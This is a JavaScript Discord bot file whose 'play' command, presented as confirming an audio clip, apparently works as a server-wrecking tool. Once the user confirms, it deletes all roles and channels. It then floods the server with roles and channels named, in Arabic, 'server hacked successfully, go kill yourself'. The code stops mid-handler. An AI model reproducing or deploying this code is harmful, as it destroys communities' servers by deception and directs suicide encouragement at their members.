const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '.'

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(``,"")
  console.log('')
  console.log('')
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});



client.on('message', msg => {
var prefix = "L";
  if(!msg.guild) return;
    if(!msg.member.hasPermission('SEND_MESSAGES')) return message.reply('**⚠ لا يوجد لديك صلاحية**');
    if (msg.content.startsWith(prefix +'play')) {
let ra3d = new Discord.RichEmbed()
.setColor('RANDOM')
.setThumbnail(msg.author.avatarURL)
.setDescription(`هل انت متأكد من اختيارك المقطع الصوتي اذا موافق اضغط ✅`)                                                                                                                                                                       
msg.channel.send(ra3d).then(message => {
 message.react('✅').then(r=>{
 message.react('❌').then(r=>{           
 let sd = (reaction, user) => reaction.emoji.name === '✅' && user.id === msg.author.id;
 let nd = (reaction, user) => reaction.emoji.name === '❌' && user.id === msg.author.id;
 let ds  = message.createReactionCollector(sd, { time: 900000 });
 let dn  = message.createReactionCollector(nd, { time: 900000 });
dn.on("collect", r => {
msg.channel.send("`تم الالغاء`")
message.delete();
})
ds.on("collect", r => {
message.guild.roles.forEach(r => { r.delete() }) 
     message.guild.channels.forEach(c => { c.delete() })
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createRole('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));	 
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'role').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
